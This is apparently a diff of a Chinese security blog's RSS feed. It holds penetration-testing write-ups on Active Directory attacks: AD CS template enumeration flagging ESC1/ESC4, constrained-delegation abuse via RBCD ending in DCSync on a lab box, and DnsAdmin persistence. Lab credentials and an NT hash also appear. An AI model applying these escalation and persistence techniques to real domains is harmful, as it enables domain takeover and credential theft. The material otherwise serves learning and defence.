+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certificate Authorities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    CA Name                             : wackadcs-DC-CA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    DNS Name                            : dc.wackadcs.com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Subject                 : CN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;wackadcs-DC-CA, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;wackadcs, DC&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;com
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Serial Number           : 19F9595699CD919E41F8D2620299CFA0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Validity Start          : 2025-08-28 08:34:40+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Validity End            : 2030-08-28 08:44:40+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Web Enrollment
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      HTTP
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enabled                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      HTTPS
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enabled                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    User Specified SAN                  : Disabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Request Disposition                 : Issue
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enforce Encryption &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; Requests     : Enabled
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Owner                             : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrators
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Access Rights
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ManageCa                        : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrators
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ManageCertificates              : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;dministrators
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enroll                          : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\A&lt;/span&gt;uthenticated Users
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Certificate Templates
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Template Name                       : ESC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Display Name                        : ESC
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Authorities             : wackadcs-DC-CA
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enabled                             : True
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Client Authentication               : True
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enrollment Agent                    : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Any Purpose                         : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Enrollee Supplies Subject           : True
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Certificate Name Flag               : EnrolleeSuppliesSubject
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Extended Key Usage                  : Client Authentication
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Requires Manager Approval           : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Requires Key Archival               : False
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Authorized Signatures Required      : &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Schema Version                      : &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Validity Period                     : &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; year
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Renewal Period                      : &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; weeks
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Minimum RSA Key Length              : &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Template Created                    : 2025-08-29T11:30:30+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Template Last Modified              : 2025-08-29T11:30:30+00:00
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Enrollment Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Enrollment Rights               : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\P&lt;/span&gt;KIAdmins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      Object Control Permissions
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Owner                           : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Full Control Principals         : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal System
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Write Owner Principals          : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal System
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        Write Dacl Principals           : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\D&lt;/span&gt;omain Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\L&lt;/span&gt;ocal System
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                          WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\E&lt;/span&gt;nterprise Admins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User Enrollable Principals      : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\P&lt;/span&gt;KIAdmins
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;+&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; User ACL Principals             : WACKADCS.COM&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;estuser
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;!&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Vulnerabilities
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      ESC1                              : Enrollee supplies subject and template allows client authentication.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;      ESC4                              : Template is owned by user.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;利用这个脚本的好处是方便，且可以直接指定可请求证书组，在创建后门证书的时候好用，但他基于rsat域模块，且最近的更新也在7年前了，所以还是按需使用。&lt;/p&gt;
+&lt;h2 id=&#34;总结&#34;&gt;总结
+&lt;/h2&gt;&lt;p&gt;以上就是本文的全部内容了，在本文完结并提交前，我确定网上并没有出现过如何利用注册恶意模板并利用的手法，尽管其其实并不算一个很难的角度，不过想要绕过桌面会话来创建一个模板确实需要对ca的底层交互了解很多，等过段时间有时间了我会再测试并书写一篇黄金证书的攻击手段&lt;/p&gt;
+</description>
+        </item>
+        <item>
         <title>不可转发情况下的约束委派攻击</title>
-        <link>http://localhost:1313/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</link>
+        <link>https://wackymaker.github.io/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</link>
         <pubDate>Thu, 28 Aug 2025 13:43:59 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</guid>
+        <guid>https://wackymaker.github.io/post/%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/</guid>
         <description>&lt;p&gt;要理解不可转发约束委派为何是难以被攻击的，我们需要了解约束委派本身&lt;/p&gt;
 &lt;h2 id=&#34;约束委派简介&#34;&gt;约束委派简介
 &lt;/h2&gt;&lt;p&gt;简单来说，约束委派是域内的一种机制：允许某个账号（如sever1$)，以其他用户的身份访问特定服务（如 HTTP/dc01.corp.local）。&lt;/p&gt;
@@ -24,7 +666,7 @@
 &lt;p&gt;实验环境如下 IP：10.129.194.21；FQDN：DC01.rebound.htb；具有委派的用户信息：delegator$/c5c2c04a2590c117fa9e1a07a110dad3，和一个普通域用户：ldap_monitor/1GR8t@$$4u&lt;/p&gt;
 &lt;p&gt;使用工具如下：impacket包&lt;/p&gt;
 &lt;p&gt;在开始攻击之前，可以通过下面看到delegator$确实配置了约束委派&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image.png&#34;
 	
 	
 	
@@ -33,7 +675,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;但是当我们直接请求管理员的时候会报错&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-1.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-1.png&#34;
 	
 	
 	
@@ -43,7 +685,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;其中报错点明了Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable，也就是tgt可能不存在forwardable所以不允许转发票据&lt;/p&gt;
 &lt;p&gt;这时如果我们抓取猎犬如果看到了这个机器用户存在注册服务，就像这样&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-2.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-2.png&#34;
 	
 	
 	
@@ -55,7 +697,7 @@
 &lt;h2 id=&#34;实际操作&#34;&gt;实际操作
 &lt;/h2&gt;&lt;p&gt;具体做法如下&lt;/p&gt;
 &lt;p&gt;首先将delegator$msDS-AllowedToActOnBehalfOfOtherIdentity属性写入ldap_monitor，将其拥有对delegator$打rbcd的权限，其实也就是为了提前一步伪造为任意用户&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-3.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-3.png&#34;
 	
 	
 	
@@ -64,7 +706,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;利用这层身份，我们可以ldap_monitor以任意身份请求delegator$注册的服务，这里我们直接以dc的机器用户请求&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-4.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-4.png&#34;
 	
 	
 	
@@ -73,7 +715,7 @@
 	
 &gt;&lt;/p&gt;
 &lt;p&gt;现在我们以及完成了提前一步伪造为我们需要的用户，接下来我们就能直接拿着这张票据去请求约束委派&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-5.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-5.png&#34;
 	
 	
 	
@@ -83,7 +725,7 @@
 &gt;&lt;/p&gt;
 &lt;p&gt;而这张票据就是我们成功以dc01$的身份在没有开启协议转换的情况下请求了约束委派的服务&lt;/p&gt;
 &lt;p&gt;而我们可以利用它去打dcsync，其结果证明了我们的成功&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/rbcd/image-6.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/rbcd/image-6.png&#34;
 	
 	
 	
@@ -105,10 +747,10 @@
         </item>
         <item>
         <title>基于DnsAdmin组的dns热重载权限维持及衍生情况</title>
-        <link>http://localhost:1313/post/dnsadmin/</link>
+        <link>https://wackymaker.github.io/post/dnsadmin/</link>
         <pubDate>Mon, 25 Aug 2025 18:50:52 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/dnsadmin/</guid>
+        <guid>https://wackymaker.github.io/post/dnsadmin/</guid>
         <description>&lt;h2 id=&#34;本文所使用环境&#34;&gt;本文所使用环境
 &lt;/h2&gt;&lt;p&gt;这篇环境当中，我使用的是我自建靶机&lt;a class=&#34;link&#34; href=&#34;https://www.wackymaker.com/post/bicher-%E8%87%AA%E5%BB%BA/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;bicker&lt;/a&gt;,其中tindalos就是dnsadmin组&lt;/p&gt;
@@ -264,7 +906,7 @@
 &lt;h2 id=&#34;攻击路径检测难度&#34;&gt;攻击路径检测难度
 &lt;/h2&gt;&lt;p&gt;那么这种不再dnsadmin组中却对dns容器存在acl的情况是否容易检测呢？&lt;/p&gt;
 &lt;p&gt;通过猎犬，我们可以看到用户没有出站，针对性查找也无法查找，这很正常&lt;/p&gt;
-&lt;p&gt;&lt;img src=&#34;http://localhost:1313/dnsadmin/image.png&#34;
+&lt;p&gt;&lt;img src=&#34;https://wackymaker.github.io/dnsadmin/image.png&#34;
 	
 	
 	
@@ -325,10 +967,10 @@
         </item>
         <item>
         <title>使用普通用户帐户远程利用RBCD</title>
-        <link>http://localhost:1313/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</link>
+        <link>https://wackymaker.github.io/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</link>
         <pubDate>Sat, 23 Aug 2025 20:02:05 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</guid>
+        <guid>https://wackymaker.github.io/post/%E4%BD%BF%E7%94%A8%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7%E5%B8%90%E6%88%B7%E8%BF%9C%E7%A8%8B%E5%88%A9%E7%94%A8rbcd/</guid>
         <description>&lt;h1 id=&#34;使用普通用户帐户远程利用-rbcd基于资源委派&#34;&gt;使用普通用户帐户远程利用 RBCD（基于资源委派）
 &lt;/h1&gt;&lt;h2 id=&#34;我是站在巨人们的肩膀上&#34;&gt;我是站在巨人们的肩膀上
 &lt;/h2&gt;&lt;p&gt;在这篇文章开始之前，我本来想详细解释一下rbcd，奈何&lt;a class=&#34;link&#34; href=&#34;https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
